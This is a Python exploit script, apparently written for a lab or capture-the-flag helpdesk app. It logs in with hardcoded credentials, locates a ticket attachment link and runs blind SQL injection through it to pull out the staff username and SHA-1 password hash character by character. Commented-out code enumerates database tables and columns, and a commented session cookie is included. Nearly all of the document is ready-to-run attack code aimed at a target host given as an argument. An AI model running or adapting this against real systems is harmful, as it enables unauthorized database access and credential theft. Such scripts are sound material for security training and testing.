#!/usr/bin/python3

import argparse
import requests
import sys
from bs4 import BeautifulSoup

# Setup
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.session()

# Create the Functions

# cookies = {"PHPSESSID":"4od7dsdtr500b91icbj345e413", "usrhash": "0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+HsZyZtc+CHMjrXD9MZLutz18sqzPkis2/rVwOq03aT9g=="}

def login(rhost):

    url = 'http://%s/support/'%rhost

    getRequest = r.get(url, proxies=proxies)

    # Get CSRF token
    soup = BeautifulSoup(getRequest.text, 'html.parser')
    csrfToken = soup.find('input',attrs = {'name':'csrfhash'})['value']

    loginURL = url + '?v=login'

    params = {'do':'login', 'csrfhash':csrfToken, 'email':'helpme@helpme.com', 'password':'godhelpmeplz','btn':'Login'}

    login = r.post(loginURL, proxies=proxies, data=params, allow_redirects=False)

    if login.status_code == 302:
        print("[+] Logged in")

def checkAttachment(rhost):
    print("[+] Checking attachment")

    url = 'http://%s/support/?v=view_tickets'%rhost

    getRequest = r.get(url, proxies=proxies)

    if 'ticket_subject' not in getRequest.text:
        print("[!] Create a ticket with attachment first")
        exit()


    soup = BeautifulSoup(getRequest.text, 'html.parser')
    a_tags = soup.find_all('a')

    # Checking if 'class' tag with value 'ticket_subject' exists
    for a_tag in a_tags:
        if 'class' in a_tag.attrs:
            class_value = ' '.join(a_tag['class'])
            
            if class_value == "ticket_subject":
                print("[+] Found ticket:", a_tag['href'])
                ticketURL = a_tag['href']

                # Checking attachment
                getRequest = r.get(ticketURL, proxies=proxies)

                soup = BeautifulSoup(getRequest.text, 'html.parser')
                a_tags = soup.find_all('a')

                for a_tag in a_tags:
                    if 'target' in a_tag.attrs:
                        class_value = ''.join(a_tag['target'])
                        
                        if class_value == '_blank':
                            print("[+] Found attachment:", a_tag['href'])
                            return a_tag['href']
                        
def injection(injectionURL):

    print("[+] Finding username")

    loop = True
    u = 1
    while loop:
        loop = False
        for character in 'abcdefghjiklmnopqrstuvwxyz0123456789':
            payload = " and substr((select username from staff),%s,1) = '%s'" % (u, character)

            inject = injectionURL + payload

            injectionRequest = r.get(inject, proxies=proxies)

            # We don't check something like image/png because the image can be in another format.
            if injectionRequest.headers['Content-Type'].startswith("image"):
                print(character, flush=True, end="")
                u +=1
                loop = True
                break

    print("\n[+] Finding hash")
    # We discover that the password is sha-1 looking at the source code, and this is 40 characters long
    for i in range(1, 41):
        for character in 'abcdefghjiklmnopqrstuvwxyz0123456789':
            payload = " and substr((select password from staff),%s,1) = '%s'" % (i, character)

            inject = injectionURL + payload

            injectionRequest = r.get(inject, proxies=proxies)

            # We don't check something like image/png because the image can be in another format.
            if injectionRequest.headers['Content-Type'].startswith("image"):
                print(character, flush=True, end="")
                break

def getDatabaseInfo(injectionURL):

    print("[+] Finding database name")

    loop = True
    u = 1
    '''
    while loop:
        loop = False
        for character in 'abcdefghjiklmnopqrstuvwxyz0123456789':
            payload = " and substring(database(),%s,1) = '%s'" % (u, character)

            inject = injectionURL + payload

            injectionRequest = r.get(inject, proxies=proxies)

            # We don't check something like image/png because the image can be in another format.
            if injectionRequest.headers['Content-Type'].startswith("image"):
                print(character, flush=True, end="")
                u +=1
                loop = True
                break
    '''

    '''
    print("[+] Finding number of tables")

    loop = True
    u = 0
    while loop:
        u +=1
        payload = " and (SELECT COUNT(*) AS table_count FROM information_schema.tables WHERE table_schema = 'support') = %s" % (u)

        inject = injectionURL + payload

        injectionRequest = r.get(inject, proxies=proxies)

        # We don't check something like image/png because the image can be in another format.
        if injectionRequest.headers['Content-Type'].startswith("image"):
            print('[+] Number of tables:', u)
            break
    '''

    '''
    print("[+] Finding tables of support database")

    for tableNumber in range(0,19):
        loop = True
        u = 1
        while loop:
            loop = False
            # Be careful, some tables has special characters
            for character in 'abcdefghjiklmnopqrstuvwxyz0123456789_':
                payload = " and substring((select table_name from information_schema.tables where table_schema='support' limit %s,1),%s,1) = '%s'" % (tableNumber, u, character)

                inject = injectionURL + payload

                injectionRequest = r.get(inject, proxies=proxies)

                # We don't check something like image/png because the image can be in another format.
                if injectionRequest.headers['Content-Type'].startswith("image"):
                    print(character, flush=True, end="")
                    u +=1
                    loop = True
                    break
    '''

    print("[+] Finding number of columns")

    loop = True
    u = 0
    while loop:
        u +=1
        payload = " and (SELECT COUNT(*) AS column_count FROM information_schema.columns WHERE table_schema = 'support' AND table_name ='staff') = %u" % (u)

        inject = injectionURL + payload

        injectionRequest = r.get(inject, proxies=proxies)

        # We don't check something like image/png because the image can be in another format.
        if injectionRequest.headers['Content-Type'].startswith("image"):
            print('[+] Number of columns:', u)
            break

    print("Finding columns from table staff")

    for columnNumber in range(0,14):
        loop = True
        u = 1
        while loop:
            loop = False
            # Be careful, some tables has special characters
            for character in 'abcdefghjiklmnopqrstuvwxyz0123456789_':
                payload = " and substring((select column_name from information_schema.columns where table_name='staff' limit %s,1),%s,1) = '%s'" % (columnNumber, u, character)

                inject = injectionURL + payload

                injectionRequest = r.get(inject, proxies=proxies)

                # We don't check something like image/png because the image can be in another format.
                if injectionRequest.headers['Content-Type'].startswith("image"):
                    print(character, flush=True, end="")
                    u +=1
                    loop = True
                    break
                        
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    
    # Call the functions

    login(rhost)

    injectionURL = checkAttachment(rhost)

    injection(injectionURL)

    # getDatabaseInfo(injectionURL)

if __name__ == '__main__':
    main()